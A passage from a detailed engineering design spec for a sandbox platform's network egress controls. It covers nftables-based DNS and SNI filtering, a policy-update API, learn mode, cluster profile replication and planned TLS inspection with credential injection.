  Blocking never removes the IP from `@fqdn_src`.
  - `ApplyNetworkBlockAll`, the quota block path (`applyNetworkQuotaState`)
    and the hold call `SetBlocked(reason, true)`.
  - Unblocking clears only that reason.
  - The iptables DROPs are kept as a second layer. Every order of the two
    firewalls is fail-closed, so callers have no ordering rule to keep.

  The DNS filter and the proxy **also** check the blocked bit, in case of races.
  This gets a regression test.
- **Bootstrap:** on the sandboxd side, `Service.EnsureEgressGatewayReady`
  follows the `EnsureLayer4Ready` shape (`atomic.Bool` + `sync.Mutex`). It
  connects to the gateway's UDS, completes the version handshake and pushes a
  full `Sync`. It's called best-effort from `pkg/daemon` after netrules wiring
  (`daemon.go:168`), and lazily on the first FQDN create if the boot attempt
  failed. On its own start, the egress-gateway process does three things, in
  order:
  1. Create the nft table, sets and chains (this is the kernel probe).
  2. Learn the bridge gateway IPs from sandboxd over the UDS (eng re-review
     S5).
     - sandboxd discovers them: the network named by `SB_DOCKER_NETWORK` via
       docker network inspect (CEO D21; docker0 by default), and for aerolvm0
       the first host address of the CNI subnet.
     - The gateway runs without docker socket access, which would be
       root-equivalent (D22).
     - The last-known list is kept in the gateway's snapshot, so a gateway
       restart can bind before sandboxd reconnects. Docker's embedded DNS
     (127.0.0.11) forwards from inside the sandbox netns, so the redirect still
     catches it; a UC on a user-defined network proves it.
  3. Bind the DNS and proxy listeners **to those gateway IPs** (REDIRECT
     rewrites the destination to the incoming interface's primary address),
     only after the input-guard chain is in place.
     - The listeners use `IP_FREEBIND`, because `aerolvm0` only appears on the
       first CNI ADD after sandboxd's async netns refill.
     - The unit is ordered `After=network-online.target containerd.service
       docker.service`.
  4. **Self-test.** sandboxd sends a probe flow from a dedicated test netns
     through the redirect (D22: sandboxd creates the netns and veth and runs
     the probe client). The gateway must see it arrive at the DNS and proxy
     listeners.
     - **How (spec review 3 F1):** the test netns joins the bridge by a veth
       and uses a reserved link-local `/32` that IPAM never hands out
       (`169.254.250.<bridge index>`), with a host route back. It is placed in
       `@fqdn_src` only for the probe.
     - **When:** it runs per bridge, when the bridge first appears (sandboxd
       reports bridge appearance over the UDS) and lazily on the first
       gateway-mode attach on that bridge. It also re-runs on gateway restart.
       A fresh containerd node therefore passes once `aerolvm0` exists, rather
       than staying unavailable. This catches hosts whose INPUT policy is DROP (ufw, hardened
     AMIs), where the kernel probe passes but every redirected request would be
     dropped. On failure the node reports the gateway as unavailable:
     gateway-mode creates get 501 and `aerolvm_egress_gateway_up` stays 0.
- **Restart (D13).** The nft state outlives both processes. Set contents are
  only ever replaced in one atomic nft transaction (flush and re-add in the same
  netlink batch), so membership never passes through empty.
  - On its own restart the gateway loads its persisted policy snapshot (written
    with temp file, fsync and rename), or waits for sandboxd's `Sync`, before
    its first write. With no snapshot it leaves the kernel sets untouched.
  - After a sandboxd restart, sandboxd pushes a full `Sync` built from local
    store rows, using the same atomic replace.
  - While the gateway itself is down, redirected flows hit closed ports, so FQDN
    sandboxes fail closed; non-FQDN sandboxes are unaffected.

### 5.4 DNS filter — `internal/egress/dnsfilter`

- **Listener:** miekg/dns, UDP + TCP on `SB_EGRESS_DNS_PORT` (default `53054`;
  routedns uses `53053`).
- **Identity:** source IP → sandbox through `bySrc`. An unknown source gets
  REFUSED.
- **Decision:** normalize the qname, then:
  - If it matches an allow rule, forward to the upstreams. These default to the
    host's own resolver; the host can reach the `127.0.0.53` stub. Override with
    `SB_EGRESS_DNS_UPSTREAMS`.
  - Otherwise, in allowlist mode, answer **NXDOMAIN** and audit a denial
    (`reason=dns_not_allowed`, rate-limited).
  - In deny-list mode (A8) the name is forwarded: hostnames can't appear in deny
    lists, so DNS filtering only protects allowlist-mode sandboxes. The docs say
    so.
- **Query types:**
  - A, CNAME, SRV, MX, TXT for allowed names are forwarded. Tunnelling needs
    an authority the attacker controls, and every non-allowlisted name is
    already cut off.
  - AAAA → NODATA (Q4).
  - HTTPS/SVCB → NODATA, so no ECH configs.
  - ANY → NOTIMP.
  - EDNS Client Subnet is stripped.
- **Learned IPs:** only for rules with an explicit port (`github.com:22`).
  - Resolved IPs pass the same filter as the proxy's dial control before
    insertion (spec review 3 C5, per the approved §4 rebinding row):
    loopback and link-local are never inserted, and private ranges only when
    CIDR-allowed.
  - For each remaining A record, add `(src, ip, port)` to `allow_learned` with
  `timeout = clamp(TTL, 30s, 1h)` **before** sending the answer (otherwise the
  client's connect races the set update). There's a per-sandbox cap
  (`SB_EGRESS_LEARNED_MAX`, default 512); past the cap, new names fail closed
  and are audited. Rules for 80/443 need no learned IPs because the proxy
  re-resolves.
  - **Write path (D18):** the shadow map skips the netlink write while an
    existing element has more than half its timeout left; each write uses its
    own nftables conn. A microbenchmark records answers/s with and without the
    cache.
  - **Lifecycle (D2):** the forward chain accepts established flows before the
    learned-set check, so a long SSH clone survives entry expiry. Narrowing a
    policy deletes that sandbox's conntrack entries for removed destinations
    (vishvananda/netlink `ConntrackDeleteFilters`). Detach and IP reuse flush the
    IP's learned entries.
- **Limits:** per-sandbox token bucket (`SB_EGRESS_DNS_QPS`); over the limit →
  REFUSED. Upstream lookups are de-duplicated with singleflight, as in routedns.

### 5.5 SNI/Host proxy — `internal/egress/proxy`

- **Listener:** `SB_EGRESS_PROXY_PORT` (default `15080`). The original port comes
  from `SO_ORIGINAL_DST`. Identity is the TCP peer IP → sandbox (the handshake
  rules out spoofing).
- **:443**
  1. Peek the ClientHello: bounded at 16 KB with a 5 s deadline, and it must
     handle multi-record or fragmented hellos. Use `crypto/tls` with a capturing
     `GetConfigForClient` over a recording conn.
  2. Match the policy on the **outer** SNI and ignore whether the ECH extension
     is present (D6). In allowlist mode, reject on no SNI, an IP-literal SNI
     (unless CIDR-allowed), or a non-matching SNI.
     - In deny-list mode (A8), a non-matching SNI proceeds under the
       default-accept verdict.
     - Also in deny-list mode, a hello with no SNI or an IP-literal SNI is
       dialed to the **original destination** (`SO_ORIGINAL_DST`), subject to
       the deny CIDRs and the SSRF dial control.
  3. **Dial `SNI:443` through the host resolver**, using a dial control shared
     with isolate:
     - loopback and link-local are always refused;
     - RFC1918/ULA are refused unless in `allow_cidr` (container gateway only).
       Isolate keeps its unconditional private, unspecified and multicast
       block, as D15 preserved; the shared dial control has a strict mode for
       it;
     - resolved IPs in deny CIDRs are refused unless the SNI matched an allow
       rule (allow wins, D4).
  4. Replay the buffered hello and splice both directions through the shared
     `internal/netsplice` helper (D12). It writes the buffered prefix first,
     keeps raw-conn splice(2), waits for both directions with `CloseWrite` on
     each EOF, and has an idle timeout.
- **Connection caps (D17):** `connLimiter`, moved to `internal/netsplice`, caps
  connections per sandbox (`SB_EGRESS_PROXY_MAX_CONNS_PER_SANDBOX`, default 512)
  and per node (`SB_EGRESS_PROXY_MAX_CONNS`, default 16384). Over the cap:
  - on :443 the proxy writes the TLS `access_denied` alert record immediately,
    **without reading the hello**, so over-cap connections hold no buffers
    (spec review 3 F2). At most 64 over-cap closes run concurrently per node;
    beyond that the proxy just closes;
  - on :80 it answers `429 Too Many Requests` with a body naming the cap.

  Either way it closes the connection and audits a rate-limited
  `reason=conn_cap` denial (CEO D10).
- **:80:** parse each request in a loop with `http.ReadRequest`. Every `Host` is
  checked with the same rules as SNI, and each request is forwarded as a small
  reverse proxy.
  `CONNECT` → 400. After a validated `Upgrade` (websocket), switch to raw
  splice.
- **Connection registry:** each live connection records its sandbox and matched
  rule, so a policy change (§5.8) can close connections whose host no longer
  matches.
- **Audit:**
  - Allowed: `destination = SNI:port`.
  - Denied: `reason ∈ {sni_not_allowed, no_sni, blocked_ip, blocked, conn_cap}`.
  - **Firewall denials (spec review 3 C9, meeting G6):** each nft reject rule
    is preceded by an audit insert, `update @rejected_flows {ip saddr . ip
    daddr . th dport}`.
    - This covers raw-IP and unlisted-port connects, QUIC/DoT, and input-chain
      host access.
    - The gateway reads the set every 2 s and streams one rate-limited audit
      event per new element (`reason=firewall_reject`). No new dependency is
      needed.
    - **The insert is its own verdict-less rule, never on the reject rule
      itself (eng re-review S10, P1 fail-open).**
      - In nftables a dynamic-set `update` on a full set returns `NFT_BREAK`,
        which abandons the rest of that rule. A reject on the same rule would
        be skipped.
      - The packet would then fall through to later rules: the deny-list
        accept, or the chain's accept policy.
      - One sandbox scanning ports could fill the shared set and turn every
        sandbox's denials on the node into accepts.
    - Each dynamic set gets an explicit `size` (65536).
    - A per-source meter (`update @reject_meter {ip saddr limit rate 20/second
      burst 100 packets}`) sits in front of the insert, so one sandbox can't
      crowd out the others' audit.
    - At each read, the gateway counts `aerolvm_egress_audit_dropped_total
      {reason="set_full"}` when the element count reaches the size.
    - `@learn_flows` uses the same verdict-less shape. A full learn set loses
      recording (`truncated:true`) and never changes a verdict.
    - EF-77.

  The proxy and DNS filter run in the egress-gateway process (D9), so events
  reach the audit chain through a **gateway → sandboxd event stream** on the
  same UDS:
  - The gateway keeps a bounded ring buffer (`SB_EGRESS_AUDIT_BUFFER`, default
    10000 events). It drops the oldest event when full and counts each drop in
    `aerolvm_egress_audit_dropped_total`.
  - It buffers while sandboxd is down and drains on reconnect.
  - sandboxd writes each event through `emitEgressAudit`, extended with
    `Result`/`Reason`, into the hash-chained JSONL. The existing per-sandbox
    audit rate limit (`SB_AUDIT_EGRESS_SANDBOX_RATE`) applies.
  - Per-reason denial counters ride the heartbeat, so sandboxd can export
    `aerolvm_egress_denied_total{reason}` (D22).
  - Learn-mode recordings do **not** come from this rate-limited stream (§5.8).
- **Metering:** unchanged, since netstats counts at the container's `eth0`.

### 5.6 Shared matcher — `pkg/egresspolicy`

This package parses, validates and compiles the grammar (§5.1). Its consumers are:

- `validateEgressPolicy`;
- the DNS filter and the proxy;
- WASM's `NetMediator`;
- isolate: it replaces `pkg/isolate/egress.go`'s matcher (`:223,287`). The
  unused copy in `internal/runtime/isolate/egress.go:25-74` is deleted with its
  test, and `policyFromCreate` stays (CQ4). Isolate flips from deny-wins to
  allow-wins (D4). `pkg/isolate/egress_test.go:27` is rewritten to assert it,
  and every other existing row is preserved (D15).

It also holds the shared SNI-peek and dial-control code. It lives in `pkg/`
because `pkg/isolate` and `pkg/wasm/worker` can't import `internal/`.

### 5.7 Runtime integration

**docker / containerd / gVisor.** A single service chokepoint,
`applySandboxEgress(ctx, sandbox)`, replaces the direct `cr.ApplyEgressPolicy`
calls at `service.go:2890` and `:5133`. Create works like this in FQDN mode:

1. Hand the driver a **driver-facing copy** of the request:
   `NetworkBlockAll=true`, CIDR lists cleared.
   - The driver installs its normal blanket DROP. The existing driver call sites
     (`client.go:677-689`, `lifecycle.go:295-301`, warm adopt
     `docker_pool.go:451-461`, `warm_adopt.go:267-281`) need **no change** and
     stay fail-closed.
   - Hostnames never reach netrules, which would otherwise try to resolve or
     parse them as `-d` arguments.
2. Once the driver returns the IP: `gateway.Attach` over the UDS, then
   `ClearBlockAllEgress`.
   - If Attach fails, or the gateway is unreachable or version-skewed, the
     create fails with 503 and rolls back the way a policy failure does today
     (container removed).
   - **Every other path that attaches** (`StartSandbox`, `Reconcile`, the P0-4
     docker start event, failover recreate): if Attach fails, the driver's
     BlockAll stays in place (fail closed). The sandbox reports
     `egress_status: "unavailable"` on GET, it is counted in
     `aerolvm_egress_attach_failed_total`, and reconcile retries.
     - A failover recreate onto a node that can't run the gateway (avoided by D20 placement when a capable node exists) lands in
       this state rather than failing open.
   - Destroy, stop and die events call `gateway.Detach(id, ip)` next to the
     existing `ClearEgressPolicy` (`events.go:195,268`, `client.go:724`,
     `lifecycle.go:402`). The netrules clears in those events become
     owner-checked too: they confirm the IP still belongs to the event's sandbox
     before deleting (P0-6, D20).
3. **Warm pool DNS (D14).** Parked containerd containers bind-mount a generated
   resolv.conf (same generator as `internal/runtime/containerd/hosts.go:52`,
   keyed by slot ID, cleaned up with the slot). Adopted sandboxes then resolve
   DNS like cold creates, and FQDN-mode DNS reaches the redirect instead of
   stopping at 127.0.0.1.

**WASM.**

- Add a `MsgSetEgressPolicy` worker message carrying the compiled policy.
- `NetMediator.DialContext` checks it:
  - An IP literal must match a CIDR entry.
  - A hostname must match a rule; the mediator then resolves it on the host with
    the shared dial control.
  - On `:443`, peek the SNI and require it to equal the dial host, which closes
    TLS-level fronting inside an allowed IP.
- The guest passes `host:port` itself (`wazero_network.go:125`), so no DNS
  interception is needed.
- The policy is sent **at create** (fixes H1) and on live update. Resident hosts
  share one mediator (`resident_server.go:77-86`), so the policy is keyed by
  sandbox ID, the same way blocks are today.

**isolate.**

- Swap in the shared matcher and add `*.` syntax.
- Live update is free: `Host.SetEgressPolicy` already replaces the policy in
  place (`pkg/isolate/egress.go:34`).
- Add denied-attempt audit (H5).

**Firecracker (Phase 4).** Identity becomes `iifname fctapN`, which can't be
forged on a point-to-point /30 (`internal/network/tap/pool.go:119-130`). The same
table gets interface-keyed sets, and listeners bind wildcard behind the input
guard (one host IP per TAP). Prerequisites: the FC NAT audit (`TODOS.md:378`) and
lifting the `unsupportedFirecrackerOption` gate (`service.go:2137-2145`).

### 5.8 Live update — `PUT /v1/sandboxes/{id}/network/policy` (Phase 2)

- **Body:** `{network_block_all, network_allow_out, network_deny_out}`. The PUT
  is a **full replace**, so the same body twice is a no-op (idempotent).
- **Response:** the effective policy.
- **Routing:** through `clusterForwardWrap` to the owner
  (`pkg/api/v1/cluster_handler.go:57`), the same path as `/network/limits`.
- **Service, `UpdateNetworkPolicy`:**
  1. Validate, including the recovery size cap.
  2. Take a **per-sandbox mutex**.
  3. Read the old row.
  4. **Cluster mode: commit the patched spec first and strictly (D10)** through
     `Cluster.UpsertSpec`, with the error returned rather than
     `replicateSpecPatch`'s best-effort warn (`internal/service/cluster_secrets.go:19-45`).
     A commit failure returns 503 and changes nothing. Single-node (Noop
     cluster) skips this step.
  5. Write the store.
  6. Apply the transition.
  7. Return the effective policy. A 2xx means both the replicated spec and the
     live firewall hold the new policy.
- **Transitions:** always **tighten first**. Install the more restrictive state
  before removing the more permissive one.

| From → To | Apply |
|---|---|
| none/CIDR → CIDR′ | netrules: insert new ACCEPTs, delete old ones (the catch-all DROP stays put) |
| any → FQDN | BlockAll → `Attach` → clear the old CIDR rules → clear BlockAll if Attach succeeded, else hold (D16) |
| FQDN → FQDN′ | Swap the policy pointer. Flush that sandbox's `allow_learned` entries (the gateway keeps a shadow list, so the delete is exact). Rewrite `allow_cidr` elements. Close proxied connections that no longer match. |
| FQDN → CIDR/none | BlockAll → `Detach` → netrules apply → clear BlockAll (unless quota-blocked; D16) |
| any → block_all | BlockAll, then `SetBlocked(true)` |

- **Stopped sandbox:** store and replicate only; the policy applies at start.
- **Firecracker:** 501 until Phase 4.
- **Failure rule (pr-review §4):** the store is the source of truth. If the
  apply fails, the sandbox is **held** (D16: `egress_hold` + `sbx-egress-hold`,
  never the shared block-all DROP) and the call returns 503
  `apply_failed_held`. A retry of the idempotent PUT converges. Reconcile is the safety
  net, not the cleanup path.
- **SDKs:** `setNetworkPolicy` / `set_network_policy` / `SetNetworkPolicy`, next
  to `setNetworkLimits` in each SDK (TS `internal/client.ts:813`, Python
  `client.py:793`, Go `pkg/microvm/client.go:330`, Rust `lib.rs:1137`, Java
  `MicroVMClient.java:558`).
- **CLI/MCP:** `--allow-host` on create (`internal/agenttools/create.go:31`
  today only has `BlockNetwork`).
- **E2B `updateNetwork` (D19, P2-5).** It replaces the allow and deny lists and
  block-all only; native-only fields (`egress_profiles`, `network_egress_mode`)
  are left as they are, since the E2B API has no way to express them. The
  service merges the E2B lists into the stored policy under the per-sandbox
  mutex. On a learn-mode sandbox, an E2B update that sets lists returns 409
  (learn mode requires empty lists). First
  confirm E2B's REST path from its OpenAPI spec. Then add the `/e2b` route mapped onto
  `Service.UpdateNetworkPolicy`, with the D4 allow/deny mapping and the D11
  allowOut-only rule. Facade tests: replace semantics, idempotent repeat,
  deny-all mapping.
- **Named egress profiles (D21, P2-6).**
  - `egress_profile` objects are stored once, replicated, and referenced by
    sandboxes; this lifts the 4 KB spec cap for large lists.
  - A profile update re-applies to every sandbox that references it.
  - Ships with 5 SDKs and docs.
  - Profile replication touches `internal/cluster`, so CLAUDE.md rule 6 applies:
    a regression test next to the changed file, a PR call-out on split-brain,
    replay safety and leader change, and a no-op when cluster mode is off.

#### Phase 2 wire contract (spec review 1)

- **Fields.** `pkg/models` `CreateSandboxRequest` and the PUT body gain:
  - `network_egress_mode`: `"enforce"` (default) or `"learn"`;
  - `egress_profiles`: a list of profile names; user names, or `builtin:<name>`,
    which is pinned to `builtin:<name>@<version>` at create (CEO D11).

  The PUT body becomes `{network_block_all, network_allow_out, network_deny_out,
  network_egress_mode, egress_profiles}`, still a full replace.
- **Combination rule.**
  - The effective allow list is the union of inline `allow_out` and every
    referenced profile, capped at 1024 hostnames (§5.1). `deny_out` is inline
    only.
  - Learn mode requires empty `allow_out`, `deny_out` and `egress_profiles`, and
    `network_block_all=false`; otherwise 400.
- **Profile routes.**
  - `PUT /v1/egress-profiles/{name}` (full replace, idempotent),
    `GET /v1/egress-profiles/{name}`, `DELETE /v1/egress-profiles/{name}`,
    `GET /v1/egress-profiles`.
  - Profiles are owner-scoped, like sandbox names. `builtin:*` profiles are
    global and read-only, and the `builtin:` prefix is reserved.
  - Deleting a profile that sandboxes still reference → 409.
  - A profile PUT that would push any referencing sandbox's effective union past
    the 1024-hostname cap → 409 naming that sandbox, so a re-apply never fails
    on caps.
  - Each profile has a `generation`. Each sandbox's GET shows
    `egress_profiles_applied: [{name, generation}]`, so a caller can see when a
    profile update has converged. The per-sandbox PUT's 2xx means live; a
    profile PUT's 2xx means stored, with fan-out following asynchronously.
- **API shapes (for the 5 SDKs).**
  - **Profile object:** `{name, allow_out: [hostnames, wildcards, host:port,
    CIDRs], description, generation, created_at, updated_at}`.
    - Names match `[a-z0-9][a-z0-9._-]{0,62}`.
    - `GET /v1/egress-profiles` pages with `?cursor=&limit=`, like other list
      APIs.
  - **PUT `/network/policy` response:** the effective policy
    `{network_block_all, network_allow_out, network_deny_out,
    network_egress_mode, egress_profiles (pinned), effective_hostname_count}`.
  - **`GET /network/learned` response:** `{mode, truncated, entries: [{host,
    ports, first_seen, last_seen, hits}], cidrs: [...], suggested_allow_out:
    [...], suggested_profile: {...} | null}`.
  - **Built-in version format:** `builtin:<name>@<YYYYMMDD>`, the catalogue
    date.
- **Profile fan-out at fleet scale.**
  - In cluster mode, profiles live in the Raft FSM (≤512 hostnames each).
  - Server-tier nodes watch FSM applies locally.
  - **Dedicated workers hold no FSM** (`internal/cluster/agent.go:37-39`). They
    keep a local profile cache, refreshed by polling the server tier the same
    way they poll `owned-recovery`.
  - Each owner re-applies a changed profile to **its own** referencing
    sandboxes, with no cross-node RPC beyond that poll.
  - **Create on a worker:** a profile lookup is a local cache read. On a cache
    miss it becomes one server-tier RPC on the boot path, which is called out in
    §8.2. If that RPC fails, the create fails with 503.
  - Rate-limited per node (`SB_EGRESS_PROFILE_APPLY_QPS`, default 50
    sandboxes/s).
  - A sandbox whose re-apply fails is held (D16) and is counted in
    `aerolvm_egress_profile_apply_failed_total` (fail closed). Reconcile
    retries it.
  - Single-node mode uses a store table and the same local re-apply.
- **Cluster atomicity (CEO D19).**
  - The FSM keeps a profile → referencing-sandbox index, updated by place,
    destroy and policy ops.
  - It checks delete-in-use (409) and union caps (409) when applying, so races
    resolve the same way on every node.
  - Profile CRUD on dedicated workers is forwarded to the server tier like other
    FSM writes.
  - Workers poll every 10 s, so a worker's view is at most 30 s stale: a
    narrowed profile is enforced fleet-wide within 30 s.
  - CLAUDE.md rule 6: regression tests next to the FSM file (concurrent create
    + delete; a leader change mid-update) and a PR call-out.
  - **Rolling-upgrade gate (Section 9; required by D19).** An old node silently
    skips Raft ops it doesn't know (a known repo risk), which would make the
    index diverge. So profile writes are accepted only once every cluster
    member reports a version that understands them; until then they return
    503. The cluster PR calls this out.
    - **Signal (eng re-review D1):** a new `FSMOpsVersion int
      json:"fv,omitempty"` field in the SWIM `nodeMeta`
      (`internal/cluster/gossip.go:26`). A missing field (an older build)
      reads as 0.
    - **Who must report it.** Every server in the current Raft configuration
      must advertise `fv` at least the profile-ops version. That includes
      failed servers, read from their last-known gossip meta. A Raft server
      with no gossip entry counts as 0.
      - Failed servers count because a voter that went down on an old build
        replays the log when it returns.
      - Precedent: Nomad's `ServersMeetMinimumVersion` with failed servers
        checked.
      - Workers hold no Raft state, so they don't gate writes. An old worker
        never advertises `egress_gateway_ready`, so it gets no gateway-mode
        creates (CEO D20).
    - **Not the capacity heartbeat.** It is pulled only from sandbox-owning
      members (`capacity_lease.go:489`), so server-only voters would never
      report.
    - **The 512-byte trap.** A regression test encodes `nodeMeta` with every
      field at its maximum realistic length and asserts the result stays under
      memberlist's `MetaMaxSize`. An overflow once stripped `RaftAddr` and
      broke voter auto-join (`gossip.go:18-25`).
    - **Tests (rule 6):** mixed `fv` → 503 `ErrClusterVersion`; all upgraded →
      accepted; a failed old-meta voter → 503.
- **Transitions added to the §5.8 table:**
  - any → learn: BlockAll → `Attach(learn)` → clear BlockAll if Attach succeeded, else hold (D16);
  - learn → enforce: BlockAll → `Update(policy)` → clear BlockAll if Update succeeded, else hold (D16);
  - a profile reference change: the FQDN → FQDN′ row.
- **Learn mode (P2-7).**
  - **Storage by runtime:**
    - docker, containerd and gVisor: the gateway;
    - WASM: the worker's mediator, reported to sandboxd over the existing worker
      message channel;
    - isolate: sandboxd's isolate host.

    `GET /learned` reads whichever applies. Recordings never come from the
    rate-limited audit stream, so they are not lossy.
  - **One implementation (eng re-review S7).** The recording type lives in
    `pkg/egresspolicy` as `Recorder` and is used by the gateway, the WASM
    mediator and the isolate host. Each runtime only feeds it observations.
    `Recorder` owns:
    - the cap and `truncated`;
    - IP → name correlation;
    - the `*.<registrable domain>` collapse;
    - the suggested profile.

    So the three runtimes return identical suggestions for identical traffic,
    and the suggestion logic has one table-driven test.
  - The gateway writes its snapshot, including recordings, debounced 5 s after
    any change.
    - **Layout (eng re-review S9, performance).** Policies and the bridge list
      go in one small file. Each learn-mode sandbox's recording goes in its
      own file under the gateway's `StateDirectory`.
    - A debounced write rewrites only the files that changed (temp file,
      fsync, rename).
    - A single combined file would rewrite every recording on any change: up
      to 1k sandboxes × 1024 entries × ~100 B ≈ 100 MB every 5 s at density.
  - After learn → enforce the recording is kept (still readable) until the
    sandbox is destroyed.
  - Capped at `SB_EGRESS_LEARN_MAX` (default 1024 entries); past the cap,
    recording stops and the response says so.
  - Discarded on destroy. Not replicated: a failover recreate starts a fresh
    recording, which is documented.
  - `GET /v1/sandboxes/{id}/network/learned` is owner-forwarded via
    `clusterForwardWrap`.
  - What it records:
    - DNS names (filter), SNI/Host (proxy);
    - non-80/443 ports through the nft dynamic set `learn_flows`
      (spec review 3 F3).
      - The forward chain runs `update @learn_flows {ip saddr . ip daddr . th
        dport}` for `@learn_src` sources, a kernel-side insert per flow, in its
        own verdict-less rule (S10).
      - The gateway reads the set every 2 s (google/nftables, an existing
        dependency) instead of scanning the whole conntrack table. Element
        timeouts outlast the read interval.
      - Entries are correlated with the DNS answers the gateway served (IP →
        name), yielding `host:port`;
    - direct-IP flows with no DNS name, suggested as `/32` CIDRs.
  - Suggestions:
    - collapse to `*.<registrable domain>` when 3 or more distinct names share
      one, never on a public suffix;
    - pass `pkg/egresspolicy` validation and caps;
    - a list over 64 inline entries is returned as a suggested profile body.
  - Runtimes: docker, containerd and gVisor via the gateway; WASM via the
    mediator; isolate via its proxy; Firecracker → 501.
  - A gateway outage fails a learn-mode sandbox closed (G7). Every learn-mode
    event is marked in audit.
- **Policy check endpoint (P2-9)**, exactly the approved CEO D5 shape.
  - Request: `{network_allow_out, network_deny_out, destination}`, where
    `destination` is `host`, `host:port`, `IP` or `IP:port`.
  - Response: `{allowed, matched_rule, default_verdict}`.
  - It does not read profiles, so it stays stateless.
  - It does no DNS resolution; the docs note that deny CIDRs applied to resolved
    IPs at connect time aren't evaluated.
  - No runtime parameter (one grammar everywhere, D15).
  - An invalid policy → 400 naming the entry.
  - Any API token may call it; it is not cluster-forwarded.

### 5.9 Phase 3 contract — inspection, credential injection, per-binary rules (CEO D6, D7, D9, D13)

Phase 3 is committed and fully specified here (CEO D9), and it stays gated on
demand. It has three items.

**P3-1 Inspection (method/path rules).** A new optional field holds rules:

```
network_egress_rules: [
  {host, ports, methods, paths, inspect: true,
   inject: {header, secret_ref},        # P3-2, optional
   binaries: [path]}                    # P3-3, optional, runc only
]
```

- **How rules relate to the rest of the policy.**
  - Rules refine hosts already allowed by `allow_out` or profiles; a rule for a
    host that isn't allowed → 400.
  - `network_egress_rules` is part of the create and PUT bodies and counts
    toward the 4 KB cluster spec cap.
  - The check endpoint ignores rules.
- Rules with `inspect: true` make the proxy terminate TLS using a **per-node
  CA**.
  - The CA key is sealed with `pkg/secrets`.
  - The CA bundle is mounted **only into sandboxes created with inspect rules**
    (the approved R2 scope, restored by spec review 3 S2). It combines the
    image's own trust store with the node CA, so custom CAs keep working.
    `SSL_CERT_FILE`, `NODE_EXTRA_CA_CERTS`, `REQUESTS_CA_BUNDLE` and `PIP_CERT`
    are set.
  - A live PUT that adds an inspect rule to a sandbox created without one
    returns 409 "recreate with inspect rules".
  - Inspect sandboxes are not warm-pool eligible (env and mounts), which §8.2
    calls out. Java's trust store is a known gap.
  - Under inspection the proxy negotiates ALPN (h2 or http/1.1) with both sides
    and applies method/path checks per request or stream.
  - On a failover recreate, the target node re-mounts **its own** CA bundle, so
    trust follows the node that terminates TLS.
- Inspection adds:
  - method/path checks (path globs; methods exact);
  - `Host == SNI`, which closes domain fronting;
  - body caps.
- Hosts without an `inspect` rule keep the Phase 1 SNI passthrough.

**P3-2 Credential injection (CEO D6).**
- `secret_ref: "env:<KEY>"` names a key in the sandbox's **own sealed env**
  (CEO D13). When an inject rule references it, sandboxd withholds the real
  value from the sandbox and sets that env var to a placeholder
  (`<KEY>=aerolvm-placeholder:<KEY>`).
- sandboxd passes the value to the gateway over the UDS for that sandbox only.
  The gateway keeps it in memory, never in its snapshot, and drops it on Detach.
  This reuses the existing sealing, replication and audit; there is no new
  secrets API.
- After TLS termination the proxy **replaces** the configured header (for
  example `Authorization`) with the real value. It never substitutes inside
  bodies or URLs.
- Audit records name the rule and `secret_ref` but redact the value.
- **Rotation requires recreating the sandbox.** There is no env-update API in
  v1, so the earlier "update the sealed env" wording is corrected (spec review
  3 C13).
- `Sync` carries injected secret values for that sandbox (memory only, never
  in the gateway snapshot), so injection survives a gateway restart.
- A live PUT that adds an inject rule for an env key the running sandbox
  already holds in clear returns 409: the secret is already exposed, so
  recreate the sandbox.
- If a `secret_ref` is missing, the request is denied, never sent with the
  placeholder.
- Result: a hijacked agent can't exfiltrate keys it never had (E2B parity).

**P3-3 Per-binary rules (CEO D7).**
- `binaries: [path]` restricts a rule to connections opened by those
  executables. This is restored to the approved X6 scope (CEO D7): it covers
  proxied **and** forwarded connections.
  - **Proxied (80/443):** the proxy looks up the owning process (sandbox netns
    `/proc/net/tcp` inode → `/proc/*/fd`) at accept, before dialing upstream.
  - **Forwarded (other ports):** eBPF cgroup `connect4`/`connect6` hooks
    attached to the sandbox's cgroup refuse the `connect()` itself when the
    calling executable isn't listed.
  - This adds a new dependency (`cilium/ebpf`, not yet in go.mod), which the PR
    calls out.
- Supported on **runc under docker and containerd only**:
  - gVisor's netstack hides guest processes from the host;
  - Firecracker microVMs are opaque to the host;
  - WASM and isolate have no binaries.

  Those runtimes return 501 when `binaries` is set.
- Risk high: root inside the sandbox can forge the identity. Docs present it as
  least privilege for trusted tooling, not as a boundary against untrusted code.

**Phase 3 use cases:** EF-52 (method/path allow and deny), EF-53 (Host != SNI
rejected), EF-54 (credential injected; the placeholder never leaves; the value
is redacted in audit; a missing ref is denied), EF-55 (per-binary allow on runc;
501 on gVisor/Firecracker/WASM/isolate). Tasks T27-T29.

Isolate gets inspection and credential injection first and nearly for free,
because `proxyEgress` already sees plaintext requests. Per-binary rules don't
apply to isolate.

---

## 6. Phasing (stacked PRs, one per task; merge nothing until the stack is green)

**Phase 0: fix the holes (first in the stack; P0-3 after P1-1)**

- P0-1: Enforce WASM `network_block_all` at create (H1). WASM allow/deny lists
  are **rejected with 501** until P1-6 lands. No more stored-but-ignored.
- P0-2: Anti-spoofing (H2). Drop `CAP_NET_RAW` for **every** docker and
  containerd sandbox (CEO D8; closes Q3). Without NET_RAW or NET_ADMIN the
  kernel enforces the configured source address. ping and raw-socket tools stop
  working in sandboxes; release notes and docs say so. EF-51: a sandbox with no
  policy cannot send a spoofed UDP packet.
- P0-3: Validate isolate egress entries (H3) through `pkg/egresspolicy`.
  Hostname deny entries return 400 (D15), with a release note.
- P0-4: Re-apply egress on the docker start event (H4).
- P0-5: Host INPUT protection for block-all and CIDR-allowlist sandboxes (H6,
  D8). `BlockAllEgress`, including quota blocks, also installs the
  `AEROLVM-INPUT` drop, so a blocked sandbox loses host services too.
  - netrules gains an INPUT jump into a per-IP `AEROLVM-INPUT` chain. It accepts
    `ct state established,related` and drops other traffic from those sandbox
    IPs, and is cleaned up with the existing clear paths.
  - Regression test plus an integration UC: a block-all sandbox cannot reach
    sandboxd's API port on its gateway IP, and toolbox calls still work.
- P0-6: Owner-checked netrules clears (H7, D20). Stop and destroy event clears
  confirm the IP still belongs to the event's sandbox (store row or netns slot
  owner) before deleting rules. Regression test: a new sandbox adopts the IP
  before the old sandbox's event is processed.

**Phase 1: FQDN mode for container runtimes, WASM and isolate**

- P1-0: `internal/netsplice`.
  - Move `spliceConns`, `proxyCopyAndCloseWrite` and `connLimiter` out of
    `internal/service/l4proxy.go`.
  - Fix half-close: wait for both directions, `CloseWrite` on each EOF, idle
    timeout (D12, D17).
  - `l4wake.go` keeps working unchanged; the move closes the TODOS.md entry "L4
    splice drops the response after a client half-close".
